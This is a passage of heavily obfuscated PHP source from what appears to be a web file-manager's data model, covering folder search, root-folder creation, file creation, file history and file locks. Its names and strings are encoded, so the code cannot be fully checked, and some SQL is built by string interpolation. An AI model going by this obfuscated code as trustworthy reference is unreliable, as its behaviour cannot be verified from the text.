$êÊÂÎ¾õ[$ìêºÛ‚Ğ[89]]) { return !1; } if (isset($×Î²ÑÌÙ[$ìêºÛ‚Ğ[655]]) && $×Î²ÑÌÙ[$ìêºÛ‚Ğ[655]] != $êÊÂÎ¾õ[$ìêºÛ‚Ğ[522]]) { return !1; } return !0; } public function listSearchChildren($†û‘ù§å, $ËåŒ¥†˜ = 5000) { $ÚÓ‰’É =& $_SERVER[è¶³ÒßÑ]; $­êÉôìÈ = array(); $—ò»É‰Î = $this->sourceInfo($†û‘ù§å); $Çı÷Û²Æ = array($ÚÓ‰’É[577] => array($ÚÓ‰’É[452], $—ò»É‰Î[$ÚÓ‰’É[577]] . $—ò»É‰Î[$ÚÓ‰’É[203]] . $ÚÓ‰’É[606])); $™Å²Ò¢ö = $this->field($ÚÓ‰’É[89])->where($Çı÷Û²Æ)->limit($ËåŒ¥†˜ + 1)->select(); $Üú½”Á× = is_array($™Å²Ò¢ö) ? count($™Å²Ò¢ö) : 0; if ($Üú½”Á× > $ËåŒ¥†˜) { return $this->_listSearchChildrenNear($†û‘ù§å, $ËåŒ¥†˜); } $ÔÀëÀö = $this->field($ÚÓ‰’É[203])->where($Çı÷Û²Æ)->select(); $­êÉôìÈ = array_to_keyvalue($ÔÀëÀö, $ÚÓ‰’É[12], $ÚÓ‰’É[203]); return $­êÉôìÈ; } private function _listSearchChildrenNear($Å›í°ù, $Œù¤¿Æ¶) { $Ø‰‡Äˆ” =& $_SERVER[è¶³ÒßÑ]; $¡…àÕÇÅ = array(); $œÑÇ âş = array($Ø‰‡Äˆ”[202] => $Å›í°ù); $¨èÏïÑ¢ = $this->field($Ø‰‡Äˆ”[2229])->where($œÑÇ âş)->select(); $š¯¢òºé = array_to_keyvalue(array_filter_by_field($¨èÏïÑ¢, $Ø‰‡Äˆ”[478], $Ø‰‡Äˆ”[101]), $Ø‰‡Äˆ”[12], $Ø‰‡Äˆ”[203]); $¡…àÕÇÅ = array_merge($¡…àÕÇÅ, array_to_keyvalue($¨èÏïÑ¢, $Ø‰‡Äˆ”[12], $Ø‰‡Äˆ”[203])); if (!$š¯¢òºé) { return $¡…àÕÇÅ; } $œÑÇ âş = array($Ø‰‡Äˆ”[202] => array($Ø‰‡Äˆ”[7], $š¯¢òºé)); $¨èÏïÑ¢ = $this->field($Ø‰‡Äˆ”[2229])->where($œÑÇ âş)->limit($Œù¤¿Æ¶)->select(); $¡…àÕÇÅ = array_merge($¡…àÕÇÅ, array_to_keyvalue($¨èÏïÑ¢, $Ø‰‡Äˆ”[12], $Ø‰‡Äˆ”[203])); $¡…àÕÇÅ = array_slice($¡…àÕÇÅ, 0, intval($Œù¤¿Æ¶)); return $¡…àÕÇÅ; } private function _listSearchBindPinyin($ ©§øÈÀ, &$´ó¢€Ø½, &$Í‘Œéó‰) { $Ğ‡ÏŸø· =& $_SERVER[è¶³ÒßÑ]; if (!isset($ ©§øÈÀ[$Ğ‡ÏŸø·[2057]]) || !$ ©§øÈÀ[$Ğ‡ÏŸø·[2057]]) { return; } if (!Input::check($ ©§øÈÀ[$Ğ‡ÏŸø·[2057]], $Ğ‡ÏŸø·[387]) || strlen($ ©§øÈÀ[$Ğ‡ÏŸø·[2057]]) < 2) { return; } $ÆòŸ˜Æ = "\x4c\105\106\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\151\157\x5f\163\157\x75\162\x63\145\x5f\155\x65\x74\x61\40\x6d\145\x74\141\40\x6f\x6e\40\x73\x6f\165\162\143\145\x2e\x73\x6f\165\162\143\x65\111\x44\x20\x3d\x20\x6d\145\164\141\56\x73\157\x75\162\143\145\111\x44"; $°Âõ¹™Ì = array(); $Í‘Œéó‰ = str_replace(array($Ğ‡ÏŸø·[60], $Ğ‡ÏŸø·[53], $Ğ‡ÏŸø·[2230]), $Ğ‡ÏŸø·[12], $Í‘Œéó‰); $Í‘Œéó‰ = $Ğ‡ÏŸø·[504] . str_replace($Ğ‡ÏŸø·[50], $Ğ‡ÏŸø·[505], $Í‘Œéó‰); $»‰¢É = $´ó¢€Ø½[$Ğ‡ÏŸø·[32]]; unset($´ó¢€Ø½[$Ğ‡ÏŸø·[32]]); foreach ($´ó¢€Ø½ as $ƒ—ïÀÏÕ => $¢“×ÙŞ¬) { $°Âõ¹™Ì[$Ğ‡ÏŸø·[504] . $ƒ—ïÀÏÕ] = $¢“×ÙŞ¬; } foreach ($»‰¢É as $÷•Ø€å¾) { $°Âõ¹™Ì[] = array($Ğ‡ÏŸø·[509] => $÷•Ø€å¾, $Ğ‡ÏŸø·[1053] => $Ğ‡ÏŸø·[2061], array($Ğ‡ÏŸø·[2231] => $÷•Ø€å¾, $Ğ‡ÏŸø·[2232] => array($Ğ‡ÏŸø·[7], array($Ğ‡ÏŸø·[531], $Ğ‡ÏŸø·[530])))); } $this->join($ÆòŸ˜Æ); $´ó¢€Ø½ = $°Âõ¹™Ì; } private function _parseSearchWhere($Ø¯şıˆİ) { $üÓÔ’¾Ğ =& $_SERVER[è¶³ÒßÑ]; $¶ˆŠêé‘ = array(); if (isset($Ø¯şıˆİ[$üÓÔ’¾Ğ[814]]) && $Ø¯şıˆİ[$üÓÔ’¾Ğ[814]]) { $¶ˆŠêé‘[$üÓÔ’¾Ğ[98]] = array($üÓÔ’¾Ğ[2233], $Ø¯şıˆİ[$üÓÔ’¾Ğ[814]]); } if (isset($Ø¯şıˆİ[$üÓÔ’¾Ğ[815]]) && $Ø¯şıˆİ[$üÓÔ’¾Ğ[815]]) { $œ‹‹ÑÌ = array($üÓÔ’¾Ğ[2234], $Ø¯şıˆİ[$üÓÔ’¾Ğ[815]]); if ($¶ˆŠêé‘[$üÓÔ’¾Ğ[98]]) { $¶ˆŠêé‘[$üÓÔ’¾Ğ[98]] = array($¶ˆŠêé‘[$üÓÔ’¾Ğ[98]], $œ‹‹ÑÌ, $üÓÔ’¾Ğ[2235]); } else { $¶ˆŠêé‘[$üÓÔ’¾Ğ[98]] = $œ‹‹ÑÌ; } } if (isset($Ø¯şıˆİ[$üÓÔ’¾Ğ[2227]]) && $Ø¯şıˆİ[$üÓÔ’¾Ğ[2227]] > 0) { $¶ˆŠêé‘[$üÓÔ’¾Ğ[89]] = array($üÓÔ’¾Ğ[2233], $Ø¯şıˆİ[$üÓÔ’¾Ğ[2227]]); } if (isset($Ø¯şıˆİ[$üÓÔ’¾Ğ[2228]]) && $Ø¯şıˆİ[$üÓÔ’¾Ğ[2228]]) { $œ‹‹ÑÌ = array($üÓÔ’¾Ğ[2234], $Ø¯şıˆİ[$üÓÔ’¾Ğ[2228]]); if ($¶ˆŠêé‘[$üÓÔ’¾Ğ[89]]) { $¶ˆŠêé‘[$üÓÔ’¾Ğ[89]] = array($¶ˆŠêé‘[$üÓÔ’¾Ğ[89]], $œ‹‹ÑÌ, $üÓÔ’¾Ğ[2235]); } else { $¶ˆŠêé‘[$üÓÔ’¾Ğ[89]] = $œ‹‹ÑÌ; } } if (isset($Ø¯şıˆİ[$üÓÔ’¾Ğ[655]]) && $Ø¯şıˆİ[$üÓÔ’¾Ğ[655]]) { $¶ˆŠêé‘[] = array($üÓÔ’¾Ğ[522] => $Ø¯şıˆİ[$üÓÔ’¾Ğ[655]], $üÓÔ’¾Ğ[520] => $Ø¯şıˆİ[$üÓÔ’¾Ğ[655]], $üÓÔ’¾Ğ[1053] => $üÓÔ’¾Ğ[2061]); } if (isset($Ø¯şıˆİ[$üÓÔ’¾Ğ[479]]) && $Ø¯şıˆİ[$üÓÔ’¾Ğ[479]]) { $ø¡Ñ©…ş = $Ø¯şıˆİ[$üÓÔ’¾Ğ[479]]; if ($ø¡Ñ©…ş == $üÓÔ’¾Ğ[88]) { $¶ˆŠêé‘[$üÓÔ’¾Ğ[478]] = 1; } else { if ($ø¡Ñ©…ş == $üÓÔ’¾Ğ[2236]) { $¶ˆŠêé‘[$üÓÔ’¾Ğ[478]] = 0; } else { if ($ø¡Ñ©…ş) { $ø¡Ñ©…ş = is_array($ø¡Ñ©…ş) ? $ø¡Ñ©…ş : explode($üÓÔ’¾Ğ[50], $ø¡Ñ©…ş); $¶ˆŠêé‘[$üÓÔ’¾Ğ[479]] = array($üÓÔ’¾Ğ[485], $ø¡Ñ©…ş); $¶ˆŠêé‘[$üÓÔ’¾Ğ[478]] = 0; } } } } $this->_parseSearchParent($Ø¯şıˆİ, $¶ˆŠêé‘); if (isset($Ø¯şıˆİ[$üÓÔ’¾Ğ[2057]]) && trim($Ø¯şıˆİ[$üÓÔ’¾Ğ[2057]])) { $à‘òï´Á = trim($Ø¯şıˆİ[$üÓÔ’¾Ğ[2057]]); $È¥¡ˆŠ = explode($üÓÔ’¾Ğ[53], $à‘òï´Á); if (strlen($à‘òï´Á) > 2 && (substr($à‘òï´Á, 0, 1) == $üÓÔ’¾Ğ[131] && substr($à‘òï´Á, -1) == $üÓÔ’¾Ğ[131]) || substr($à‘òï´Á, 0, 1) == $üÓÔ’¾Ğ[68] && substr($à‘òï´Á, -1) == $üÓÔ’¾Ğ[68]) { $à‘òï´Á = substr($à‘òï´Á, 1, -1); $È¥¡ˆŠ = array($à‘òï´Á); } $¶ˆŠêé‘[$üÓÔ’¾Ğ[32]] = array(array($üÓÔ’¾Ğ[605], $üÓÔ’¾Ğ[2059] . $à‘òï´Á . $üÓÔ’¾Ğ[2059])); if (count($È¥¡ˆŠ) > 1) { $¶ˆŠêé‘[$üÓÔ’¾Ğ[32]] = array(); foreach ($È¥¡ˆŠ as $Â©ğî®) { if (!trim($Â©ğî®)) { continue; } $¶ˆŠêé‘[$üÓÔ’¾Ğ[32]][] = array($üÓÔ’¾Ğ[605], $üÓÔ’¾Ğ[2059] . trim($Â©ğî®) . $üÓÔ’¾Ğ[2059]); } } } return $¶ˆŠêé‘; } private function _parseSearchParent($©ßòòÈ¥, &$µ¶–“©Œ) { $‘ú‹ÎõŸ =& $_SERVER[è¶³ÒßÑ]; if (!isset($©ßòòÈ¥[$‘ú‹ÎõŸ[202]]) || !$©ßòòÈ¥[$‘ú‹ÎõŸ[202]]) { return; } $Äºº•ï¦ = $this->pathInfo($©ßòòÈ¥[$‘ú‹ÎõŸ[202]]); $Î«é±øã = $Äºº•ï¦[$‘ú‹ÎõŸ[202]] . $‘ú‹ÎõŸ[12] === $‘ú‹ÎõŸ[238]; $ãÈÆ¶Š = $Äºº•ï¦[$‘ú‹ÎõŸ[200]] == $‘ú‹ÎõŸ[571]; if ($Äºº•ï¦[$‘ú‹ÎõŸ[588]] == $‘ú‹ÎõŸ[589]) { $ÁÁó±™õ = $this->sourceInfo($©ßòòÈ¥[$‘ú‹ÎõŸ[202]]); $Äºº•ï¦[$‘ú‹ÎõŸ[577]] = $ÁÁó±™õ[$‘ú‹ÎõŸ[577]]; } $µ¶–“©Œ[$‘ú‹ÎõŸ[645]] = array($‘ú‹ÎõŸ[605], $Äºº•ï¦[$‘ú‹ÎõŸ[577]] . $©ßòòÈ¥[$‘ú‹ÎõŸ[202]] . $‘ú‹ÎõŸ[606]); $“ƒ´…Æ‡ = isset($©ßòòÈ¥[$‘ú‹ÎõŸ[1918]]) && in_array($‘ú‹ÎõŸ[571], $©ßòòÈ¥[$‘ú‹ÎõŸ[1918]]); if (!$“ƒ´…Æ‡ || !$ãÈÆ¶Š || !$Î«é±øã || !$Äºº•ï¦[$‘ú‹ÎõŸ[480]]) { return; } if (!AuthModel::authCheckRoot($Äºº•ï¦[$‘ú‹ÎõŸ[480]][$‘ú‹ÎõŸ[481]])) { return; } $Ù¸ßÜè = $Äºº•ï¦[$‘ú‹ÎõŸ[562]] . $‘ú‹ÎõŸ[12]; if ($Ù¸ßÜè == $‘ú‹ÎõŸ[101]) { unset($µ¶–“©Œ[$‘ú‹ÎõŸ[645]]); $µ¶–“©Œ[$‘ú‹ÎõŸ[200]] = self::TYPE_GROUP; return; } $Éµª¹‚» = Model($‘ú‹ÎõŸ[578])->groupChildrenAll($Ù¸ßÜè); $²”Ğ”«É = count($Éµª¹‚»); if ($²”Ğ”«É <= 1) { return; } $”Óöİ÷ª = array($‘ú‹ÎõŸ[202] => 0, $‘ú‹ÎõŸ[200] => self::TYPE_GROUP, $‘ú‹ÎõŸ[562] => array($‘ú‹ÎõŸ[7], $Éµª¹‚»)); $šÌßøŸº = $this->field($‘ú‹ÎõŸ[2237])->where($”Óöİ÷ª)->limit($²”Ğ”«É)->select(); $µ¶–“©Œ[$‘ú‹ÎõŸ[645]] = array(); foreach ($šÌßøŸº as $¡ó¶¼¼) { $µ¶–“©Œ[$‘ú‹ÎõŸ[645]][] = array($‘ú‹ÎõŸ[605], $‘ú‹ÎõŸ[587] . $¡ó¶¼¼[$‘ú‹ÎõŸ[203]] . $‘ú‹ÎõŸ[606]); } $µ¶–“©Œ[$‘ú‹ÎõŸ[645]][] = $‘ú‹ÎõŸ[2061]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ƒ‚¤²”×) { $³Æ¨”÷Å =& $_SERVER[è¶³ÒßÑ]; $±ş‡¹æ° = Model($³Æ¨”÷Å[570])->where(array($³Æ¨”÷Å[1752] => $ƒ‚¤²”×))->find(); $ôÔî±§ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ƒ‚¤²”×, $±ş‡¹æ°[$³Æ¨”÷Å[32]]); $this->userDesktopAdd($ôÔî±§); return $ôÔî±§; } public function userDesktopAdd($÷é©¹ıË) { $±ÁÖá—Ì =& $_SERVER[è¶³ÒßÑ]; $±ğ‰òôñ = LNG($±ÁÖá—Ì[2238]); $–é¼ìóÚ = $this->mkdir($÷é©¹ıË, $±ğ‰òôñ); $this->metaSet($–é¼ìóÚ, $±ÁÖá—Ì[2239], $±ÁÖá—Ì[101]); $this->metaSet($÷é©¹ıË, $±ÁÖá—Ì[2240], $–é¼ìóÚ); } public function userPathSafeAdd($ÏóøË×Å) { $úû¬”Åˆ =& $_SERVER[è¶³ÒßÑ]; $ìÇÌÑì = Model($úû¬”Åˆ[570])->getInfoFull($ÏóøË×Å); if (!$ìÇÌÑì) { return !1; } if (_get($ìÇÌÑì, $úû¬”Åˆ[592])) { return $ìÇÌÑì[$úû¬”Åˆ[532]][$úû¬”Åˆ[2241]]; } $ğÉ®é¦’ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÏóøË×Å, $úû¬”Åˆ[2242], $úû¬”Åˆ[499]); Model($úû¬”Åˆ[570])->metaSet($ÏóøË×Å, $úû¬”Åˆ[2241], $ğÉ®é¦’); $this->metaSet($ğÉ®é¦’, $úû¬”Åˆ[2243], $ÏóøË×Å); return $ğÉ®é¦’; } public function groupRootAdd($àĞ±Ò£à) { $äíˆıÁ– =& $_SERVER[è¶³ÒßÑ]; $Á–÷Ü˜¿ = Model($äíˆıÁ–[578])->where(array($äíˆıÁ–[2051] => $àĞ±Ò£à))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $àĞ±Ò£à, $Á–÷Ü˜¿[$äíˆıÁ–[32]]); } public function systemRootPathAdd($ºøòíÄŸ) { if ($ºøòíÄŸ != $_SERVER[è¶³ÒßÑ][598]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ºøòíÄŸ); } public function userRootRemove($óª¶Øáê) { $Àë°ÎŞ = $this->targetSourceRoot(SourceModel::TYPE_USER, $óª¶Øáê, !0); foreach ($Àë°ÎŞ as $·•¦Ì‘é) { if (!$·•¦Ì‘é) { continue; } $this->remove($·•¦Ì‘é[$_SERVER[è¶³ÒßÑ][203]], !1); } } public function groupRootRemove($¬äö÷¦ü) { $Ä÷Æ­² = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $¬äö÷¦ü); if (!$Ä÷Æ­²) { return; } $this->remove($Ä÷Æ­²[$_SERVER[è¶³ÒßÑ][203]], !1); } private function _mkdirRoot($øâøÄ©½, $‚Ì™şŒ´, $Ä‘°¿Ì°, $Õ„½â = '') { $ŒÉ¶ü™ =& $_SERVER[è¶³ÒßÑ]; $õıÇ¯µ½ = defined($ŒÉ¶ü™[2185]) ? USER_ID : 0; $–­ê˜Õ´ = array($ŒÉ¶ü™[470] => 0, $ŒÉ¶ü™[641] => $øâøÄ©½, $ŒÉ¶ü™[642] => $‚Ì™şŒ´, $ŒÉ¶ü™[639] => 1, $ŒÉ¶ü™[643] => $õıÇ¯µ½, $ŒÉ¶ü™[644] => $õıÇ¯µ½, $ŒÉ¶ü™[640] => $Õ„½â, $ŒÉ¶ü™[645] => $ŒÉ¶ü™[587], $ŒÉ¶ü™[497] => 0, $ŒÉ¶ü™[610] => 0, $ŒÉ¶ü™[535] => 0, $ŒÉ¶ü™[646] => $ŒÉ¶ü™[12]); if ($ÒÕ¨ºÛ = $this->where($–­ê˜Õ´)->find()) { return $ÒÕ¨ºÛ[$ŒÉ¶ü™[203]]; } $æÃ•ëƒ‘ = "\115\x6f\x64\x65\154\123\x6f\x75\162\x63\x65\x2e\x6d\x6b\x64\x69\x72\122\x6f\x6f\164\56{$øâøÄ©½}\56{$‚Ì™şŒ´}\56" . $Ä‘°¿Ì°; CacheLock::lock($æÃ•ëƒ‘); $–­ê˜Õ´[$ŒÉ¶ü™[32]] = $Ä‘°¿Ì°; $äÉ²˜Á¡ = $this->add($–­ê˜Õ´); $Èßø—ğú = array($ŒÉ¶ü™[647] => short_id($äÉ²˜Á¡)); $this->where(array($ŒÉ¶ü™[484] => $äÉ²˜Á¡))->save($Èßø—ğú); CacheLock::unlock($æÃ•ëƒ‘); return $äÉ²˜Á¡; } private function targetSourceRoot($è¸—âó, $ìì‚–¦”, $†º‡ˆÔï = false) { $¯İª±ç =& $_SERVER[è¶³ÒßÑ]; $‚Ø—«å = array($¯İª±ç[470] => 0, $¯İª±ç[641] => $è¸—âó, $¯İª±ç[642] => $ìì‚–¦”); if ($†º‡ˆÔï) { $ãÔü‰‘º = $this->where($‚Ø—«å)->select(); return $ãÔü‰‘º ? $ãÔü‰‘º : array(); } $”º“¹¦ = $this->where($‚Ø—«å)->find(); return $”º“¹¦ ? $”º“¹¦ : array(); } public function sourceRootGroup($ßğ…ğ­Ã) { $œ‘ÃîŞÕ =& $_SERVER[è¶³ÒßÑ]; if (is_string($ßğ…ğ­Ã)) { $ßğ…ğ­Ã = array($ßğ…ğ­Ã); } $¢¤Ñü‘ƒ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ßğ…ğ­Ã, $œ‘ÃîŞÕ[230]); $£ò¿­î‹ = array($œ‘ÃîŞÕ[438] => $¢¤Ñü‘ƒ, $œ‘ÃîŞÕ[435] => array($œ‘ÃîŞÕ[812] => count($ßğ…ğ­Ã))); $this->_listDataApply($£ò¿­î‹[$œ‘ÃîŞÕ[438]]); $this->_listMake($£ò¿­î‹); return array_to_keyvalue($£ò¿­î‹[$œ‘ÃîŞÕ[95]], $œ‘ÃîŞÕ[562]); } public function mkfile($ŞÊèÆ¹û, $Éõ½È×ê, $®ËõÍß = '', $˜˜¨£ÜÄ = REPEAT_RENAME) { $Ó“ ¡ƒ“ =& $_SERVER[è¶³ÒßÑ]; $–Éˆ¹Í = Model($Ó“ ¡ƒ“[667])->addFileByContent($®ËõÍß, $Éõ½È×ê); return $this->_createFileCall($ŞÊèÆ¹û, $Éõ½È×ê, $–Éˆ¹Í, $˜˜¨£ÜÄ, $Ó“ ¡ƒ“[1405]); } public function addFile($ËÖ®×Œµ, $ãƒñ——, $é²¸µ½Ñ, $¯ç¤È© = false, $¦ºˆ¶èÉ = REPEAT_RENAME) { $¶êìô · = Model($_SERVER[è¶³ÒßÑ][667])->addFile($ãƒñ——, $é²¸µ½Ñ, $¯ç¤È©); return $this->_createFileCall($ËÖ®×Œµ, $é²¸µ½Ñ, $¶êìô ·, $¦ºˆ¶èÉ); } public function addFileByFileID($Ï»ıØ‹, $üŒÅ‡š, $É¬«ü¥Î, $ØüŒ¢§š = REPEAT_RENAME) { $ÇÍÌ¡Š£ =& $_SERVER[è¶³ÒßÑ]; $…×à·Ïê = Model($ÇÍÌ¡Š£[667])->find($üŒÅ‡š); Model($ÇÍÌ¡Š£[667])->linkAdd($üŒÅ‡š); return $this->_createFileCall($Ï»ıØ‹, $É¬«ü¥Î, $…×à·Ïê, $ØüŒ¢§š); } public function addFileByRemote($èæõ‹ªü, $ïÚİï• , $™Îº­ë, $˜âşáÆ± = array(), $ÉÆÊÚÇë = REPEAT_RENAME) { $ó’ŞÕŸÇ = Model($_SERVER[è¶³ÒßÑ][667])->addFileByRemote($ïÚİï• , $™Îº­ë, $˜âşáÆ±); return $this->_createFileCall($èæõ‹ªü, $™Îº­ë, $ó’ŞÕŸÇ, $ÉÆÊÚÇë); } private function _createFileCall($íî´¶çÜ, $¢†«ñˆõ, $İâÁ´¹, $ƒÂˆÍø–, $™‚ƒ¦ú§ = "\165\x70\x6c\157\141\x64") { $€äèú¨Á =& $_SERVER[è¶³ÒßÑ]; $¨ñşó = !1; $this->setMasterDB(); $this->lockWriteStart($íî´¶çÜ, $¢†«ñˆõ); $ƒ©‰Ù”¾ = $this->fileNameExist($íî´¶çÜ, $¢†«ñˆõ); $ šÅÂä€ = $this->_createFile($íî´¶çÜ, $¢†«ñˆõ, $İâÁ´¹, $ƒÂˆÍø–, $¨ñşó); if (!$¨ñşó) { Model($€äèú¨Á[537])->remove($İâÁ´¹[$€äèú¨Á[534]]); } if ($¨ñşó && $ šÅÂä€ && $ šÅÂä€ != $ƒ©‰Ù”¾) { Model($€äèú¨Á[2211])->eventCreate($ šÅÂä€, $™‚ƒ¦ú§); } $this->lockWriteEnd($íî´¶çÜ, $¢†«ñˆõ); return $ šÅÂä€; } public function mkdir($×„ğ¹¢ê, $ÏÊıœÖÕ, $¾Õ·Ÿ• = REPEAT_SKIP) { $çÉ¸´ =& $_SERVER[è¶³ÒßÑ]; $this->setMasterDB(); $¸¾ø«¥ = $this->sourceInfo($×„ğ¹¢ê); if (!$¸¾ø«¥) { return !1; } $this->lockWriteStart($×„ğ¹¢ê, $ÏÊıœÖÕ); if ($¾Õ·Ÿ• !== !1) { $ê…šíû = $this->fileNameExist($×„ğ¹¢ê, $ÏÊıœÖÕ); if ($ê…šíû && $¾Õ·Ÿ• != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($×„ğ¹¢ê, $ÏÊıœÖÕ); return $ê…šíû; } $ÏÊıœÖÕ = $this->fileNameAuto($×„ğ¹¢ê, $ÏÊıœÖÕ, $¾Õ·Ÿ•); } $üÇı¼Á = array($çÉ¸´[639] => 1, $çÉ¸´[487] => $ÏÊıœÖÕ, $çÉ¸´[640] => $çÉ¸´[12], $çÉ¸´[535] => 0, $çÉ¸´[610] => 0); $…¥œ™Âœ = $this->_addSource($üÇı¼Á, $¸¾ø«¥); Model($çÉ¸´[2211])->eventCreate($…¥œ™Âœ, $çÉ¸´[1406]); $this->lockWriteEnd($×„ğ¹¢ê, $ÏÊıœÖÕ); return $…¥œ™Âœ; } public function listSourceRoot($åğûİõ˜, $î¾ƒÊ§Ç, $üĞ¸¢¯¬ = "\163\x6f\x75\162\143\x65\x49\104\54\164\x61\162\x67\145\x74\111\x44\x2c\163\151\172\x65") { $ñŸÒÃ¶— =& $_SERVER[è¶³ÒßÑ]; $‘«‰Ÿ¥ = $ñŸÒÃ¶—[447]; $´¸›òİÙ = array(); $¹«íİ±¸ = 1024 * 50; $êÒˆœø = is_array($êÒˆœø) ? $êÒˆœø : array(); $Œ¡í¦à = count($î¾ƒÊ§Ç); $ûÓ½Ú‘Ï = $this->tablePrefix . $ñŸÒÃ¶—[2244]; for ($Ğ¬×®ÌÕ = 0; $Ğ¬×®ÌÕ < $Œ¡í¦à; $Ğ¬×®ÌÕ++) { $êÛÇåñ¢ = $î¾ƒÊ§Ç[$Ğ¬×®ÌÕ]; $‘«‰Ÿ¥ .= "\x53\x45\114\105\x43\x54\40\x2a\x20\106\122\x4f\115\40\x28\123\105\114\105\x43\124\x20{$üĞ¸¢¯¬}\x20\x46\122\x4f\115\40\140{$ûÓ½Ú‘Ï}\x60\x20\x57\x48\x45\122\x45\x20"; $‘«‰Ÿ¥ .= "\x60\160\141\x72\x65\156\x74\111\104\x60\75\x30\40\101\x4e\x44\x20\140\x74\141\x72\x67\145\164\x49\104\140\75{$êÛÇåñ¢}\40\x41\x4e\104\40\x60\x74\141\162\x67\x65\x74\x54\x79\x70\145\140\75{$åğûİõ˜}\x20\141\x6e\144\x20\x66\x69\x6c\x65\x54\171\160\x65\75\47\47\x20\154\x69\155\151\164\40\x31\x29\x20\x61\163\x20\x74\x62\x5f{$Ğ¬×®ÌÕ}\40\x55\x4e\111\x4f\116\40\x41\x4c\114\40"; if ((strlen($‘«‰Ÿ¥) >= $¹«íİ±¸ || $Ğ¬×®ÌÕ == $Œ¡í¦à - 1) && $‘«‰Ÿ¥) { $‘«‰Ÿ¥ = substr($‘«‰Ÿ¥, 0, -strlen($ñŸÒÃ¶—[1091])); $¼ğâš˜º = $this->query($‘«‰Ÿ¥); $‘«‰Ÿ¥ = $ñŸÒÃ¶—[12]; $´¸›òİÙ = array_merge($´¸›òİÙ, $¼ğâš˜º); } } return $´¸›òİÙ; } private function _createFile($È¬¢¯³®, $ûÅ„ÇĞ„, $ßãğ¹Ü¼, $Íğ³Éá, &$ƒñ®Ğä) { $µ¸ĞÏ‰§ =& $_SERVER[è¶³ÒßÑ]; $†°©° Ô = $this->sourceInfo($È¬¢¯³®); if (!$ßãğ¹Ü¼ || !$†°©° Ô) { return !1; } if ($Íğ³Éá !== !1) { $¯Ëùöø› = $this->fileNameExist($È¬¢¯³®, $ûÅ„ÇĞ„); } $ƒñ®Ğä = !0; if ($Íğ³Éá && $¯Ëùöø›) { if ($Íğ³Éá == REPEAT_SKIP) { $ƒñ®Ğä = !1; return $¯Ëùöø›; } else { if ($Íğ³Éá == REPEAT_REPLACE) { $»äı¦öà = $this->sourceInfo($¯Ëùöø›); $¦Òè¸ø = $this->fileHistory($»äı¦öà, $ßãğ¹Ü¼[$µ¸ĞÏ‰§[534]], $ßãğ¹Ü¼[$µ¸ĞÏ‰§[89]]); if (!$¦Òè¸ø) { $ƒñ®Ğä = !1; } else { $this->folderSizeReset($È¬¢¯³®); } return $¯Ëùöø›; } else { $ûÅ„ÇĞ„ = $this->fileNameAuto($È¬¢¯³®, $ûÅ„ÇĞ„, $Íğ³Éá, !1); } } } $ ïáœ‡ = array($µ¸ĞÏ‰§[639] => 0, $µ¸ĞÏ‰§[487] => $ûÅ„ÇĞ„, $µ¸ĞÏ‰§[640] => substr(get_path_ext($ûÅ„ÇĞ„), 0, 10), $µ¸ĞÏ‰§[535] => $ßãğ¹Ü¼[$µ¸ĞÏ‰§[534]], $µ¸ĞÏ‰§[610] => $ßãğ¹Ü¼[$µ¸ĞÏ‰§[89]]); $í™ËÑÁ× = $this->_addSource($ ïáœ‡, $†°©° Ô); $this->folderSizeReset($È¬¢¯³®, intval($ ïáœ‡[$µ¸ĞÏ‰§[89]])); return $í™ËÑÁ×; } protected function fileHistory($×ÃÆ¤ƒ, $¤Ñ¢Í™İ, $›£Àè¼) { $šÆÒ‘À =& $_SERVER[è¶³ÒßÑ]; if ($×ÃÆ¤ƒ[$šÆÒ‘À[534]] == $¤Ñ¢Í™İ) { return !1; } $this->checkLock($×ÃÆ¤ƒ[$šÆÒ‘À[203]], $¤Ñ¢Í™İ); Model($šÆÒ‘À[2245])->addHistory($×ÃÆ¤ƒ); $ŒÇ¿ÉŸø = array($šÆÒ‘À[644] => USER_ID, $šÆÒ‘À[491] => time(), $šÆÒ‘À[534] => $¤Ñ¢Í™İ, $šÆÒ‘À[89] => $›£Àè¼); $this->where(array($šÆÒ‘À[484] => $×ÃÆ¤ƒ[$šÆÒ‘À[203]]))->save($ŒÇ¿ÉŸø); $this->sourceCacheClear($×ÃÆ¤ƒ[$šÆÒ‘À[203]]); return !0; } public function checkLock($èÅ€á†, $³£—‚§Å) { $‘Êğç‘¿ =& $_SERVER[è¶³ÒßÑ]; $şÆõİµ­ = $this->pathInfo($èÅ€á†); if (!$this->fileIsLock($şÆõİµ­, !0)) { return; } $°ì›Õ = Session::get($‘Êğç‘¿[2246]); $û…•„°… = substr($şÆõİµ­[$‘Êğç‘¿[32]], 0, -1 - strlen($şÆõİµ­[$‘Êğç‘¿[179]])) . $‘Êğç‘¿[1268] . $°ì›Õ . $‘Êğç‘¿[10] . $şÆõİµ­[$‘Êğç‘¿[179]]; $õ´ôü“Ø = Model($‘Êğç‘¿[667])->find($³£—‚§Å); $this->_createFileCall($şÆõİµ­[$‘Êğç‘¿[202]], $û…•„°…, $õ´ôü“Ø, REPEAT_REPLACE, $‘Êğç‘¿[1405]); $ê»¹®™˜ = $şÆõİµ­[$‘Êğç‘¿[532]][$‘Êğç‘¿[603]]; $îë˜¾Ç = $ê»¹®™˜[$‘Êğç‘¿[2247]] ? $ê»¹®™˜[$‘Êğç‘¿[2247]] : $ê»¹®™˜[$‘Êğç‘¿[32]]; show_json(LNG($‘Êğç‘¿[2248]) . $‘Êğç‘¿[2249] . LNG($‘Êğç‘¿[2250]) . $‘Êğç‘¿[2251] . $îë˜¾Ç . $‘Êğç‘¿[2252], !1); } public function fileIsLock($ÒÃØ°Ğá, $é‰€ºÚî = false) { $äÖå‰Úß =& $_SERVER[è¶³ÒßÑ]; if (!_get($ÒÃØ°Ğá, $äÖå‰Úß[599], 0)) { return !1; } if ($ÒÃØ°Ğá[$äÖå‰Úß[532]][$äÖå‰Úß[602]] != USER_ID) { return !0; } $ú°Œ¿ƒÃ = $GLOBALS[$äÖå‰Úß[6]][$äÖå‰Úß[102]][$äÖå‰Úß[600]]; if ($ÒÃØ°Ğá[$äÖå‰Úß[532]][$äÖå‰Úß[601]] <= time() - 